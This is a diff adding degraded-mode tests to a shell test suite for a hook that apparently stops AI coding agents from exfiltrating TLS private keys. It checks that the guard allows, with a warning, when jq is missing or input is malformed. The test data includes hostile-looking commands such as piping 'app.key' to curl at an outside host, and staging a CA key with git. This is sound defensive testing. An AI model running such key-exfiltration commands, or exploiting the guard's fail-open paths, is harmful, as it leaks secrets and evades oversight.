@@ -53,6 +53,57 @@ run_case 0 "grep the tls dir"            'grep -r foo .thrum/var/tls/'
 run_case 0 "transmit unrelated key"      'cat app.key | curl https://example.com'
 run_case 0 "benign arbitrary command"    'echo hello world'
 
+# Degraded mode: the guard cannot evaluate (jq missing, or unusable input).
+# It must ALLOW (exit 0) and say so on stderr — never a bare 127/5 "Hook failed".
+BASH_BIN="$(command -v bash)"
+NOJQ="$(mktemp -d)"
+trap 'rm -r "${NOJQ:?}"' EXIT
+for t in cat grep; do ln -s "$(command -v "$t")" "$NOJQ/$t"; done
+
+# run_degraded <desc> <stdin> <path-dir-or-empty-for-real-PATH> <stderr-needle>
+run_degraded() {
+  local desc="$1" stdin="$2" pathdir="$3" needle="$4"
+  local got err
+  set +e
+  if [[ -n "$pathdir" ]]; then
+    err=$(printf '%s' "$stdin" | PATH="$pathdir" "$BASH_BIN" "$HOOK" 2>&1 >/dev/null)
+  else
+    err=$(printf '%s' "$stdin" | "$BASH_BIN" "$HOOK" 2>&1 >/dev/null)
+  fi
+  got=$?
+  set -e
+  if [[ "$got" -ne 0 ]]; then
+    echo "FAIL [$desc]: expected exit 0, got $got (stderr: $err)"
+    fails=$((fails + 1))
+  elif [[ -n "$needle" && "$err" != *"$needle"* ]]; then
+    echo "FAIL [$desc]: stderr missing '$needle' (stderr: $err)"
+    fails=$((fails + 1))
+  elif [[ -z "$needle" && -n "$err" ]]; then
+    echo "FAIL [$desc]: expected silent allow, stderr: $err"
+    fails=$((fails + 1))
+  else
+    echo "ok   [$desc]"
+  fi
+}
+
+DENY_CMD='git add .thrum/var/tls/ca.key'
+DENY_JSON=$(jq -nc --arg c "$DENY_CMD" '{tool_name:"Bash", tool_input:{command:$c}}')
+# Control: with jq present the same input still blocks (exit 2).
+run_case 2 "control: jq present still blocks" "$DENY_CMD"
+run_degraded "jq absent: message + allow"        "$DENY_JSON" "$NOJQ" "jq not found on PATH"
+run_degraded "jq absent: install hint (dnf/apk)" "$DENY_JSON" "$NOJQ" "apk add jq"
+run_degraded "jq absent: names the guard"        "$DENY_JSON" "$NOJQ" "guard is NOT checking"
+run_degraded "malformed input: message + allow"  'not json'   ""      "could not parse the hook input"
+run_degraded "empty stdin: loud allow"           ''           ""      "the hook input is empty"
+run_degraded "empty stdin, jq absent: allow"     ''           "$NOJQ" "jq not found on PATH"
+
+# Valid JSON whose tool_input is NOT an object must not crash the guard: a
+# string or array makes jq fail to index it (reported as unparsable), null has
+# no command. All ALLOW (exit 0); the object form above still blocks (control).
+run_degraded "tool_input is a string: allow"    '{"tool_name":"Bash","tool_input":"ls"}'   "" "could not parse the hook input"
+run_degraded "tool_input is an array: allow"    '{"tool_name":"Bash","tool_input":["ls"]}' "" "could not parse the hook input"
+run_degraded "tool_input is null: silent allow" '{"tool_name":"Bash","tool_input":null}'   "" ""
+
 # Drift check: the codex copy must stay byte-identical to this claude hook.
 # (The cursor variant is a deliberate difference and is excluded by name.)
 CODEX_COPY="$SCRIPT_DIR/../../codex-plugin/plugins/thrum/scripts/block-tls-key-exfil.sh"
